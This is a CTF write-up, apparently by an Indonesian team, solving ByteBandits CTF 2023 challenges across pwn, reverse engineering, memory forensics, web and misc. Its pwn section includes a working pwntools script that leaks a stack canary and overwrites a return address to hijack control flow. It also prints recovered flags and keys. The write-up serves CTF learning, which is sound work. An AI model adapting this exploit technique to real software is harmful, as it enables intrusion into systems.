# pwn
---
## Medium pwn
### Vulerability
- buffer overflow
- stack leak
### How To Solve
Untuk menyelesaikan challenge ini kita perlu mendapatkan canary untuk membypass stack check. Disini kita bisa memanfaatkan fungsi gimme_pointer() untuk mendapatkan canary.

![](Pasted%20image%2020230206061956.png)

setelah mendapatkan canary, kita perlu untuk melakukan buffer overflow dan merubah LSB pada stack agar kita bisa masuk ke fungsi yang akan mengeprint flagnya yaitu fungsi this_function_literally_prints_the_flag().

Berikut solve script yang saya gunakan untuk mensolve challenge ini:

```python
from pwn import *
import sys
from Crypto.Util.number import long_to_bytes, bytes_to_long

BINARY = "./ez-pwn-2_patched"
context.binary = exe = ELF(BINARY, checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"
context.endian = "little"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)


x, p = init()
x.debug((
    # "break *gimme_pointer+148\nc\nc"
    "finish"
))
p.recvuntil(b"here: ")
leak = eval(p.recvline().strip())
info(f"{leak=:x}")
canary_addr = leak+(24)
info(f"{canary_addr=:x}")
canary_addr = long_to_bytes(canary_addr)[::-1]
canary_addr = bytes_to_long(canary_addr)
p.send(b""+hex(canary_addr).replace("0x", "").encode()+b"00")

p.recvline()
p.recvline()
canary = eval(b"0x"+p.recvline())
canary = long_to_bytes(canary)[::-1]+b"\x00"
canary = bytes_to_long(canary)
canary = canary
info(f"{canary=:x}")

pay = b""+hex(canary_addr).replace("0x", "").encode()+b"0000"
pay += cyclic(8)
pay += p64(canary)
pay += cyclic(8)
pay += b"\xf7\x08"
p.send(pay)
# print(p.recvall(timeout=2))
p.interactive()
```

# Rev
---
## ez-pz-xor
### TL;DR
Challenge ini sedikit tricky karena menerapkan teknik anti debugger menggunakan ptrace untuk mengubah xor key, sehingga saat program di debug akan berbeda keynya dengan program yang di jalankan dengan biasa

### How To Solve
Untuk menyelesaikan challenge ini kita perlu unutuk mendapatkan xor key yang sebenarnya, ini bisa kita dapatkan di fungsi __do_global_ctor_aux

![](Pasted%20image%2020230206062058.png)

Kita perlu untuk meng-xor local_20 dengan 0x0119011901190119

https://gchq.github.io/CyberChef/#recipe=From_Hex(%27Auto%27)XOR(%7B%27option%27:%27Hex%27,%27string%27:%270119011901190119%27%7D,%27Standard%27,false)To_Hex(%27None%27,0)&input=MDUzOTA1MzkwNTM5MDUzOQ

Setelah mendapatkan keynya kita perlu untuk membruteforce xor agar mendapatkan string yang sesuai yaitu 'password' 

![](Pasted%20image%2020230206062127.png)

Untuk mendapatkan pin yang sesai saya menggunakan script berikut.

```python
awal = "0420042004200420"
awal = bytes.fromhex(awal)[::-1]
menjadi = b"password"

for i in range(len(awal)):
    for j in range(0xff):
        x = awal[i] ^ j
        if x == menjadi[i]:
            print(chr(j), end="")
```

Setelah itu kita masukkan ke server, dan kita akan mendaptkan flagnya

![](Pasted%20image%2020230206062218.png)

# Forensic
---
## Memory Dump

```
% vol3 -f Memdump.raw windows.filescan.FileScan | grep 'ConsoleHost_history' 
0xc88f21961af0.0\Users\bbctf\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt    216
```

terus di dump

```
% vol3 -f memdump.raw windows.dumpfiles.DumpFiles --virtaddr 0xc88f21961af0
```

% strings ConsoleHost_history.txt

```
$xorkey = bbctf
$xorkey = "bbctf"
$aescipherkey = "ByteBandits-CTF Jan 2023"
$encrypted_flag = "m74/XKCNkHmzJHEPAOHvegV96AOubRnSUQBpJnG4tHg="
```

Decode di [https://www.devglan.com/online-tools/aes-encryption-decryption](https://www.devglan.com/online-tools/aes-encryption-decryption "https://www.devglan.com/online-tools/aes-encryption-decryption")

```
Select Cipher Mode of Decryption : ECB
 Key Size in Bits : 192
 Enter Secret Key used for Encryption : ByteBandits-CTF Jan 2023
 AES Decrypted Output (Base64): ZmxhZ3tWMExAdGlMaVR5XzRfZGFfdzFOfQ==
```

## Imageception
```
% vol3 -f imageception.raw windows.filescan.FileScan | grep .png 
0xa08f6ca23200.0\Users\bbctf\Desktop\imageception.png   216
```

atau

```
% vol3 -f imageception.raw windows.filescan.FileScan | grep 'magesection'
```

terus di dump juga

```
% vol3 -f imageception.raw windows.dumpfiles.DumpFiles --virtaddr 0xa08f6ca23200
di soal Memdump pertama, console history gak ditemukan
```

# Web
---
## Hash Browns

```python
import requests
'''
 running tor first before execute this file

check with :
lsof -i -P | grep LISTEN | grep :$PORT
or
lsof -nP -iTCP:$PORT | grep LISTEN
or
lsof -nP -i:$PORT | grep LISTEN
'''
def get_tor_session():
    session = requests.session()    
    # Tor uses the 9050 port as the default socks port
    session.proxies = {'http':  'socks5://127.0.0.1:9050',
                       'https': 'socks5://127.0.0.1:9050'}
    return session

# prints the header to get
# 'Set-Cookie': 'garlic=cmztpaurxxnoqz3p2on73msbohg5sk74l2fxnxp27gky6cdjqzqq6nad
print(requests.get("http://web.bbctf.fluxus.co.in:1004/").headers)

# Make a request through the Tor connection (.onion)
# clue = garlic from Set-Cookie
session = get_tor_session()
print(session.get("http://cmztpaurxxnoqz3p2on73msbohg5sk74l2fxnxp27gky6cdjqzqq6nad.onion/").text)
```

# Misc
---
## Peer Pressure 
```python
import requests
import http.client
import base64
from hachoir.parser import createParser
from hachoir.metadata import extractMetadata


http.client._MAXLINE = 655360

host = "http://web.bbctf.fluxus.co.in:1002"
r = requests.head(host+"/aGVhZA==").headers

imgdata = base64.b64decode(r['png'])
filename = 'head.png' # I assume you have a way of picking unique filenames
# print(r['png'])
with open(filename, 'wb') as f:
    f.write(imgdata)

parser = createParser(filename)
metadata = extractMetadata(parser)

for line in metadata.exportPlaintext():
    print(line)
```

output :

```
Metadata:
- Image width: 263 pixels
- Image height: 191 pixels
- Bits/pixel: 24
- Pixel format: RGB
- Compression rate: 2.6x
- Compression: deflate
- Comment: date:create=2023-02-04T05:39:41+00:00
- Comment: date:modify=2023-02-04T05:39:41+00:00
- Comment: date:timestamp=2023-02-04T05:39:41+00:00
- Comment: flag{D0_N0T_G3T_PR355UR3D}
- MIME type: image/png
- Endianness: Big endian
```

# External
---
Berikut writeup dari salah satu tim kami:

## Daffainfo
https://github.com/daffainfo/ctf-writeup/tree/main/ByteBanditsCTF%202023
List chall yang ada:
- Improper Error Handling
- Hi-Score
- Easy pwn
- Vastness of Space
- Meaning of Life
- Virus Attack